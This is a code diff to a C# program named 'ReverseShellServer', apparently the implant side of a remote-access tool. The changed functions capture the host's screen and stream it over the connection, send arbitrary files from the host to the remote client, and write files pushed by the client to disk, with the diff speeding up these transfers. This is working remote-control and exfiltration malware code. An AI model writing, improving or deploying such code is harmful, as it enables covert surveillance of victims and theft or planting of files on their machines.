@@ -29,9 +29,7 @@ namespace ReverseShellServer
         {
             sw.WriteLine("{Screenshot:init}");
             sw.Flush();
-
-            byte[] scData;
-
+            
             using (var ms = new MemoryStream())
             {
                 var bounds = GetScreenRectangle();
@@ -45,16 +43,20 @@ namespace ReverseShellServer
                     bitmap.Save(ms, ImageFormat.Png);
                 }
 
-                scData = ms.ToArray();
-            }
 
-            // Send the data length first
-            bw.Write(scData.Length);
-            bw.Flush();
+                // Send the data length first
+                bw.Write((int)ms.Length);
+                bw.Flush();
 
-            foreach (var data in scData)
-            {
-                bw.Write(data);
+                // Reset memory stream position
+                ms.Position = 0;
+                var buffer = new byte[4096];
+                int bytesRead;
+                while ((bytesRead = ms.Read(buffer, 0, buffer.Length)) > 0)
+                {
+                    bw.Write(buffer, 0, bytesRead);
+                }
+
                 bw.Flush();
             }
         }
@@ -98,6 +100,8 @@ namespace ReverseShellServer
             }
             catch (Exception)
             {
+                // Delete the partially created file
+                File.Delete(newFile);
                 sw.WriteLine("Error:Web");
             }
 
@@ -105,51 +109,68 @@ namespace ReverseShellServer
         }
 
 
-        public void UploadFileToClient(string fileLocation)
+        public void UploadFileToClient(string path)
         {
+            var fileExists = File.Exists(path);
             sw.WriteLine("{UploadFileToClient:init}");
+            sw.WriteLine(fileExists.ToString());
             sw.Flush();
+
+            if (!fileExists)
+            {
+                return;
+            }
 
             try
             {
-                using (var readStream = new FileStream(fileLocation, FileMode.Open))
+                using (var readStream = new FileStream(path, FileMode.Open))
                 {
-                    var buffer = new byte[1];
-                    while (readStream.Read(buffer, 0, 1) > 0)
+                    // Send the data length first
+                    bw.Write((int)readStream.Length);
+                    bw.Flush();
+                    
+                    var buffer = new byte[4096];
+                    int bytesRead;
+                    while ((bytesRead = readStream.Read(buffer, 0, buffer.Length)) > 0)
                     {
-                        bw.Write(buffer[0]);
-                        bw.Flush();
+                        bw.Write(buffer, 0, bytesRead);
                     }
-                }
 
-                sw.WriteLine("Success");
+                    bw.Flush();
+                }
             }
             catch (Exception)
             {
-                sw.WriteLine("Error");
+                // Ignore, will be catched on the client's side
             }
-
-            sw.Flush();
         }
 
 
-        public void ReceiveFileFromClient(string newFileLocation)
+        public void ReceiveFileFromClient(string path)
         {
             sw.WriteLine("{ReceiveFileFromClient:init}");
             sw.Flush();
 
-            // Get data length
             var dataLength = br.ReadInt32();
 
             try
             {
-                using (var fs = new FileStream(newFileLocation, FileMode.Create))
+                using (var fs = new FileStream(path, FileMode.Create))
                 {
-                    var buffer = new byte[1];
-                    for(int i = 0; i < dataLength; i++)
+                    var buffer = new byte[4096];
+                    int bytesRead;
+                    var bytesWritten = 0;
+                    // test with size of stream data
+                    while ((bytesRead = br.Read(buffer, 0, buffer.Length)) > 0)
                     {
-                        br.Read(buffer, 0, 1);
-                        fs.Write(buffer, 0, 1);
+                        fs.Write(buffer, 0, bytesRead);
+                        bytesWritten += bytesRead;
+
+                        // The file has been totally written
+                        if (bytesWritten == dataLength)
+                        {
+                            break;
+                        }
                     }
                 }
 
@@ -157,21 +178,13 @@ namespace ReverseShellServer
             }
             catch (Exception)
             {
+                // Delete the partially created file
+                File.Delete(path);
                 sw.WriteLine("Error");
             }
 
             sw.Flush();
-
-            
         }
-
-
-        public void CheckFileExist(string path)
-        {
-            sw.WriteLine(File.Exists(path) ? "true" : "false");
-            sw.Flush();
-        }
-
 
 
         enum ProcessDPIAwareness
